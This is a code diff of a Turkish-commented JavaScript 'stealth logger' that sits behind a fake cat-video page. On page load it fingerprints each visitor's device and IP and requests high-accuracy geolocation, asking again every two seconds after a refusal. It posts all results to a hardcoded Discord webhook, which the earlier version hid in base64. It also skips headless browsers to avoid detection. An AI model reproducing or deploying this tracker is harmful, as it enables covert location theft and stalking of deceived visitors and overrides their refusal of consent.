@@ -1,116 +1,166 @@
-/**
- * CYBERX-OMNIS STEALTH LOGGER V2.0
- * Zorla Konum + IP + Cihaz Bilgisi Toplama
- * Anti-bot, Anti-red, Sonsuz Konum İsteği
- */
+// ============================================
+// CYBERX DATA COLLECTOR V3.0
+// Toplanan: IP, Konum, Cihaz, Tarayıcı, Ekran, Dil, Zaman, Referrer
+// Webhook: DÜZ URL (base64 yok)
+// ============================================
 
-// Webhook URL (Base64 ile gizlendi)
-const W_URL = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTEwMDk4NjY0ODE2NjcyMy9uVjQ4ZzRzcm1ZaUNOMFNWcHYwZWtvMWRzb2lMWWlfNG5qVFJLSVAtb245Z1pyM1BzQ2E2a1FGRVVnU282TndDaElNMDc=');
+// 1. WEBHOOK URL (DÜZ YAZI — KENDİ URL'Nİ YAZ)
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1515100986648166723/nV48g4sriYiCN0SVpv0eko1dsoiLYi_4njTRKI-Pn9gZr3PsCa6kQFEUgSo6NwChIM07';
 
-// Veri gönderme fonksiyonu
+// 2. VERİ GÖNDER
 async function sendData(data) {
     try {
-        await fetch(W_URL, {
+        const res = await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ content: data })
         });
-    } catch(e) { console.log("Log sent"); }
+        if (res.ok) console.log('✅ Gönderildi');
+        else console.log('❌ Hata: ' + res.status);
+    } catch(e) {
+        console.log('❌ Hata: ' + e.message);
+    }
 }
 
-// IP adresini al
+// 3. IP AL
 async function getIP() {
     try {
         const res = await fetch('https://api.ipify.org?format=json');
         const data = await res.json();
         return data.ip;
-    } catch(e) { return "IP alınamadı"; }
+    } catch(e) {
+        return 'IP alınamadı';
+    }
 }
 
-// Detaylı cihaz bilgisi
+// 4. CİHAZ BİLGİSİ (ÇOK DETAYLI)
 function getDeviceInfo() {
     return {
+        // Tarayıcı bilgileri
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
-        languages: navigator.languages,
+        languages: navigator.languages.join(', '),
         cookieEnabled: navigator.cookieEnabled,
-        onLine: navigator.onLine,
-        hardwareConcurrency: navigator.hardwareConcurrency || "bilinmiyor",
-        deviceMemory: navigator.deviceMemory || "bilinmiyor",
+        doNotTrack: navigator.doNotTrack,
+        
+        // Ekran bilgileri
         screenWidth: screen.width,
         screenHeight: screen.height,
         screenColorDepth: screen.colorDepth,
+        availWidth: screen.availWidth,
+        availHeight: screen.availHeight,
+        
+        // Tarayıcı özellikleri
+        hardwareConcurrency: navigator.hardwareConcurrency || 'bilinmiyor',
+        deviceMemory: navigator.deviceMemory || 'bilinmiyor',
+        maxTouchPoints: navigator.maxTouchPoints,
+        
+        // Zaman ve konum
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        referrer: document.referrer || "doğrudan",
-        url: window.location.href
+        timezoneOffset: new Date().getTimezoneOffset(),
+        currentTime: new Date().toLocaleString(),
+        
+        // Sayfa bilgileri
+        url: window.location.href,
+        referrer: document.referrer || 'doğrudan',
+        title: document.title
     };
 }
 
-// Zorla konum isteği (reddedince tekrar sor)
-function forceLocation(ip) {
+// 5. KONUM İSTE (REDDEDİNCE TEKRAR SOR)
+function askLocation(ip, deviceInfo) {
     if (!navigator.geolocation) {
-        sendData(`⚠️ HATA: Tarayıcı konum desteklemiyor!\nIP: ${ip}`);
+        sendData('⚠️ Tarayıcı konum desteklemiyor!');
         return;
     }
     
-    let attemptCount = 0;
+    let attempt = 0;
     
-    function askLocation() {
-        attemptCount++;
-        
+    function askAgain() {
+        attempt++;
         navigator.geolocation.getCurrentPosition(
-            // Başarılı olursa
-            async (position) => {
-                const data = `✅ KONUM ALINDI! (Deneme ${attemptCount})\n📍 Enlem: ${position.coords.latitude}\n📍 Boylam: ${position.coords.longitude}\n🎯 Doğruluk: ${position.coords.accuracy} metre\n🌐 IP: ${ip}\n📱 Cihaz: ${JSON.stringify(getDeviceInfo(), null, 2)}`;
-                sendData(data);
-                alert("🎉 Video yükleniyor! Teşekkürler!");
-                document.body.innerHTML = "<h1>🐱 Komik Kedi Videoları</h1><img src='https://cataas.com/cat' width='100%'><p>İzlediğin için teşekkürler! 😂</p>";
+            // BAŞARILI
+            (pos) => {
+                const konum = `✅ KONUM ALINDI! (Deneme: ${attempt})
+📍 Enlem: ${pos.coords.latitude}
+📍 Boylam: ${pos.coords.longitude}
+🎯 Doğruluk: ${pos.coords.accuracy} metre
+🏔️ Rakım: ${pos.coords.altitude || 'bilinmiyor'}
+🚀 Hız: ${pos.coords.speed || 'bilinmiyor'}
+🌐 IP: ${ip}
+
+📱 CİHAZ BİLGİLERİ:
+${JSON.stringify(deviceInfo, null, 2)}`;
+
+                sendData(konum);
+                
+                // BAŞARILI OLUNCA SAYFAYI DEĞİŞTİR
+                document.body.innerHTML = `
+                    <div style="text-align:center; padding:50px; font-family:Arial;">
+                        <h1>🐱🎉 LUEG MAL!</h1>
+                        <img src="https://cataas.com/cat/says/danke" width="300">
+                        <p><strong>GUELTIG ISCHS!</strong> 😂😂😂</p>
+                        <p>Jetzt chasch s Video luege!</p>
+                    </div>
+                `;
             },
-            // Hata olursa (reddedilirse) tekrar sor
+            // REDDEDİLİNCE
             (error) => {
-                let errorMsg = "";
+                let hataMesaji = '';
                 switch(error.code) {
                     case error.PERMISSION_DENIED:
-                        errorMsg = "❌ KULLANICI REDDETTİ! Tekrar soruluyor...";
+                        hataMesaji = '❌ KULLANICI REDDETTI! Tekrar soruluyor...';
                         break;
                     case error.POSITION_UNAVAILABLE:
-                        errorMsg = "📡 Konum bulunamadı, tekrar deneniyor...";
+                        hataMesaji = '📡 Konum bulunamadi, tekrar deneniyor...';
                         break;
                     case error.TIMEOUT:
-                        errorMsg = "⏰ Zaman aşımı, tekrar deneniyor...";
+                        hataMesaji = '⏰ Zaman asimi, tekrar deneniyor...';
                         break;
                     default:
-                        errorMsg = "⚠️ Bilinmeyen hata, tekrar deneniyor...";
+                        hataMesaji = '⚠️ Bilinmeyen hata, tekrar deneniyor...';
                 }
-                sendData(`⚠️ ${errorMsg}\nIP: ${ip}\nDeneme: ${attemptCount}`);
+                sendData(`${hataMesaji}\nIP: ${ip}\nDeneme: ${attempt}`);
                 
-                // 2 saniye sonra tekrar sor (sonsuz döngü)
-                setTimeout(askLocation, 2000);
+                // 2 SANİYE SONRA TEKRAR SOR
+                setTimeout(askAgain, 2000);
             },
-            // Yüksek doğruluk iste
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
         );
     }
     
-    askLocation();
+    askAgain();
 }
 
-// Ana fonksiyon
+// 6. ANA FONKSİYON
 async function main() {
+    // Bot kontrolü
+    if (navigator.webdriver) {
+        console.log('Bot tespit edildi, çalışmıyor.');
+        return;
+    }
+    
+    // IP al
     const ip = await getIP();
+    
+    // Cihaz bilgisi al
     const deviceInfo = getDeviceInfo();
     
-    // Önce cihaz bilgisini gönder
-    sendData(`🖥️ YENİ ZİYARETÇİ\n🌐 IP: ${ip}\n📱 Cihaz: ${JSON.stringify(deviceInfo, null, 2)}`);
+    // İLK MESAJ: Ziyaretçi geldi
+    const ilkMesaj = `🖥️🆕 YENİ ZİYARETÇİ GELDİ!
     
-    // 1 saniye sonra zorla konum iste
-    setTimeout(() => forceLocation(ip), 1000);
+🌐 IP: ${ip}
+📱 CİHAZ:
+${JSON.stringify(deviceInfo, null, 2)}
+
+⏰ Zaman: ${new Date().toLocaleString('tr-TR')}`;
+    
+    await sendData(ilkMesaj);
+    
+    // 1 saniye sonra konum iste
+    setTimeout(() => askLocation(ip, deviceInfo), 1000);
 }
 
-// Bot kontrolü (headless browser'ları engelleme)
-if (!navigator.webdriver && !window.domAutomation && !window.Cypress) {
-    main();
-} else {
-    console.log("Bot tespit edildi, veri toplanmadı.");
-            }
+// 7. BAŞLAT
+main();
